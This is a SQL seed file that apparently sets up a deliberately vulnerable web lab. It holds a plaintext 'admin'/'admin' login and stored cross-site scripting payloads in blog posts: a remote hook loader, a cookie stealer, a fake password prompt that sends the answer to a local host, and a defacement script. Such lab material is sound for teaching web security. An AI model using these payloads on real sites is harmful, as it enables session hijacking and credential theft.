DROP TABLE IF EXISTS users;

CREATE TABLE users (
    id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(80) NOT NULL,
    password VARCHAR(80) NOT NULL
);

INSERT INTO users (username, password) VALUES ( 'admin', 'admin');

DROP TABLE IF EXISTS posts;

CREATE TABLE posts (
    id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,
    title varchar(80),
    body text
);

INSERT INTO posts (title, body) VALUES
('flash update', 'H4X0R<script src="//127.0.0.1:8000/flash/hook.js"></script>'),
('session stealer', 'H4X0R<script>document.location.href="//127.0.0.1:8000?"+document.cookie;</script>'),
('password stealer', 'H4X0R<script>var answer = prompt(" Your session has expired. Please re-enter your password:");document.location.href="//127.0.0.1:8000/?password="+answer;</script>'),
('deface', 'H4X0R<script>document.getElementById("logo").innerHTML="<a href=''/''>H4X0R LAB</a>"</script>'),
('alert example', 'You should see an alert box <script>alert("you have been haxored!");</script>'),
('safe post', 'Sesame snaps powder marshmallow. Oat cake marshmallow candy canes. Lollipop gummies I love cotton candy fruitcake fruitcake gingerbread. Icing danish macaroon. Bear claw gummies topping tootsie roll cheesecake apple pie caramels. Icing jelly souffl&eacute; chocolate cake chupa chups pudding I love. Macaroon gummi bears cake powder jujubes chocolate gummies chocolate jujubes.');
